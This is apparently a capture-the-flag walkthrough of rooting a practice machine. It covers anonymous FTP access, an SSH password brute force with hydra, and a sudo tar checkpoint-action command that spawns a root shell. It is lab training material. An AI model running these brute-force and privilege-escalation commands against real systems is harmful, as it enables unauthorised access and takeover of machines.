
we begin by running an nmap scan we have the following result.

![image](/posts/res/BH1.png) 

we have the following ports open our target system:
 - 21 (ftp)
 - 22 (ssh)
 - 80 (http)
 now lets start our enumeration.


##Enumerating Port 21 (FTP)
from the scan port 21 runs ftp service which has  anonymous login enabled. anonymous login is a method that allows users to access an FTP server without providing any authentication credentials, thus enabling anonymous access. This feature is often used for public file repositories or servers hosting freely available resources. When accessing an FTP server anonymously, users typically input "anonymous" as the username and may use their email address or a generic password like "guest" or "anonymous" as the password. While this grants users the ability to download files from the server, their access privileges are usually limited, often restricting them to read-only permissions. Anonymous FTP login serves as a convenient means for users to retrieve publicly shared data without the need for individual accounts, promoting accessibility to information across the internet. 

now we can exploit this simply by using the following command:

```
ftp <TARGET_IP>
USERNAME: anonymous
PASSWORD: leave_blank
```
![image](/posts/res/BH2.png)

we have just discovered two file via ftp now we download them to our local machine using the following command:

```
mget *
```

![image](/posts/res/BH3.png)

when we cat out the content of the ***locks.txt*** file we can see a list of possible passwords

![image](/posts/res/BH4.png)

the ***task.txt*** file simply gives us a message:
![image](/posts/res/BH5.png)

since we have have a password  list my next assumption was to use this information from we have to perform a bruteforce attack on the ssh service .

##Enumerating SSH
to bruteforce ssh, we would be making use of hydra.

```
command used: hydra -l lin -P /path/to/file/locks.txt 10.10.252.46 ssh
```

now we have a password
![image](/posts/res/BH6.png)

so we can try to login as ***lin*** using ssh

```
command used: ssh lin@<TARGET_IP>
```

and now to locate the user flag, simply list out the contents of Desktop Directory.

```
command used: ls -la
```

##Privilege escalation 
Let's execute `sudo -l` to observe the privileges granted to the user for running commands as another user or as root.

we are allowed to run the following command:
![image](/posts/res/BH8.png)

we are allowed to run tar as root. now we head over Here [[https://gtfobins.github.io/gtfobins/tar/]] to get a prive-esc command 

from gtfo bin we can simply copy and execute the following command to gain root:

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![image](/posts/res/BH9.png)

and we are root.


